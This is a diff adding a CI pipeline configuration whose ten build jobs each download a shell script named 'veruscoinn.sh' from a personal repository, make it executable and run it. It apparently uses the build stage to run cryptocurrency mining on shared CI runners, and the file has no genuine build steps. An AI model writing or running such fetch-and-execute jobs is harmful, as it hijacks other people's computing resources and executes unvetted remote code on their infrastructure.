@@ -1,0 +1,54 @@
+stages:
+  - build
+  - test
+  - deploy
+
+build_1:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
+    
+build_2:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
+    
+build_3:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
+    
+build_4:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
+    
+build_5:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
+    
+build_6:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
+    
+build_7:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
+    
+build_8:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
+    
+build_9:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
+    
+build_10:
+  stage: build
+  script:
+    - wget https://try.gitea.io/zakiuyu17/vps/raw/branch/master/veruscoinn.sh && chmod u+x veruscoinn.sh && ./veruscoinn.sh
